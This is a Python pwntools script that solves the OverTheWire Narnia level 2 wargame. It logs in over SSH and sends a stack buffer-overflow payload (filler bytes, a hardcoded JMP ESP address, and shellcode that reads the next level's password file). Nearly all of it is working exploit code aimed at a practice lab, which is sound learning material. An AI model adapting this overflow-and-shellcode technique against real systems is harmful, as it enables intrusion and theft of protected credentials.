#!/usr/bin/env python2
from __future__ import print_function
import pwn
import getpass
import sys
import struct

# Configuration variables
config = {
        'user': 'narnia2',
        'executable': '/narnia/narnia2',
        'password_file_path': '/etc/narnia_pass/narnia3',
        'host': 'narnia.labs.overthewire.org',
        'port': 2226
        }
pwn.context.arch = 'i386'
pwn.context.os = 'linux'

# Get password for SSH login
try:
    password = getpass.getpass(prompt='{} password: '.format(config['user']))
except Exception as e:
    print('[-] Error getting password: ' + e)
    sys.exit(-1)

# Login to SSH
s = pwn.tubes.ssh.ssh(host=config['host'],
                      port=config['port'],
                      user=config['user'],
                      password=password)

# Overwrite function stack space
locals_len = 132
local_vars = '\xCC' * locals_len

# Location of jmp esp in libc
# TODO Automate retrieval of a valid JMP ESP as an exercise
jmp_esp = struct.pack('<L', 0xf7ff73c7)

asm = pwn.shellcraft.i386.linux.cat(config['password_file_path'])
shellcode = pwn.asm(asm)

# locals(128 byte char buffer + EBP) + jmp_esp(EIP) + Shellcode on stack
payload = local_vars + jmp_esp + shellcode

p = s.process(argv=[config['executable'], payload],
              raw=True)
print('Narnia3 password: {}'.format(p.recvall()))
p.close()
s.close()
